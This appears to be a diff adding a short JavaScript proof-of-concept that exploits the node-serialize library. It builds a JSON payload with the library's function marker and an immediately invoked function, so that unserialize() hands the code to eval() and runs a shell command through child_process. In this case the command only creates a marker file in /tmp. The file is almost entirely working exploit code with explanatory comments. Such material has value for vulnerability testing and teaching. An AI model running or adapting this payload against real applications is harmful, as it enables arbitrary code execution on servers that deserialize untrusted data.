@@ -1,0 +1,15 @@
+```javascript
+const serialize = require("node-serialize");
+
+// Malicious payload: a JSON property whose value string is prefixed with
+// node-serialize's function marker "_$$ND_FUNC$$_" followed by an
+// Immediately Invoked Function Expression (IIFE). unserialize() detects the
+// marker and passes the remainder straight into eval(), so the IIFE runs
+// as soon as the payload is unserialized.
+const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned_node_serialize\');return 1;}()"}';
+
+const result = serialize.unserialize(payload);
+
+console.log("unserialize result:", result);
+console.log("Exploit executed - check for /tmp/pwned_node_serialize");
+```
